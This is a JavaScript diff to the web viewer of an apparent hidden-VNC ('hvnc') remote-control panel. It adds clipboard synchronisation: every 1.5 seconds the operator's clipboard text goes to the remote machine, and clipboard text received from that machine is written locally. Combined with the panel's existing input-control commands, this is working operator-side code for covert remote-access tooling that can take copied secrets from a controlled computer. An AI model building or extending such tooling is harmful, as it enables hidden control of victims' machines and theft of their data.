@@ -66,6 +66,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   const agentFps = document.getElementById("agentFps");
   const viewerFps = document.getElementById("viewerFps");
   const statusEl = document.getElementById("streamStatus");
+  const clipboardSyncCtrl = document.getElementById("clipboardSyncCtrl");
 
   function syncInputEnableState() {
     if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
@@ -91,6 +92,10 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   const inputBackpressureBytes = 256 * 1024;
   let h264ErrorCount = 0;
   let h264RetryTimer = null;
+
+  let clipboardSyncTimer = null;
+  let lastClipboardText = "";
+  let clipboardSyncActive = false;
 
   const storedCodecPref = localStorage.getItem(codecPrefKey);
   if (storedCodecPref === "0") {
@@ -179,6 +184,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     }
 
     updateControls();
+    checkClipboardSync();
   }
 
   function updateControls() {
@@ -194,6 +200,49 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     if (stopBtn) {
       stopBtn.disabled = !wsOpen || (!isStarting && !isStreaming);
     }
+  }
+
+  function startClipboardSync() {
+    if (clipboardSyncActive) return;
+    clipboardSyncActive = true;
+    lastClipboardText = "";
+    sendCmd("clipboard_sync_start", {});
+    clipboardSyncTimer = setInterval(async () => {
+      if (!clipboardSyncCtrl || !clipboardSyncCtrl.checked || streamState !== "streaming") {
+        stopClipboardSync();
+        return;
+      }
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text && text !== lastClipboardText) {
+          lastClipboardText = text;
+          sendCmd("clipboard_sync", { text });
+        }
+      } catch {}
+    }, 1500);
+  }
+
+  function stopClipboardSync() {
+    if (!clipboardSyncActive) return;
+    clipboardSyncActive = false;
+    if (clipboardSyncTimer) {
+      clearInterval(clipboardSyncTimer);
+      clipboardSyncTimer = null;
+    }
+    sendCmd("clipboard_sync_stop", {});
+  }
+
+  function checkClipboardSync() {
+    const shouldSync = clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming";
+    if (shouldSync && !clipboardSyncActive) {
+      startClipboardSync();
+    } else if (!shouldSync && clipboardSyncActive) {
+      stopClipboardSync();
+    }
+  }
+
+  if (clipboardSyncCtrl) {
+    clipboardSyncCtrl.addEventListener("change", checkClipboardSync);
   }
 
   function clearOfflineTimer() {
@@ -655,6 +704,13 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         console.error("hvnc: server error:", msg.error || msg.message);
         return;
       }
+      if (msg && msg.type === "clipboard_content") {
+        if (clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming" && msg.text) {
+          lastClipboardText = msg.text;
+          navigator.clipboard.writeText(msg.text).catch(() => {});
+        }
+        return;
+      }
       return;
     }
 
@@ -673,6 +729,13 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     }
     if (msg && msg.type === "hvnc_error") {
       console.error("hvnc: server error:", msg.error || msg.message);
+      return;
+    }
+    if (msg && msg.type === "clipboard_content") {
+      if (clipboardSyncCtrl && clipboardSyncCtrl.checked && streamState === "streaming" && msg.text) {
+        lastClipboardText = msg.text;
+        navigator.clipboard.writeText(msg.text).catch(() => {});
+      }
       return;
     }
   }
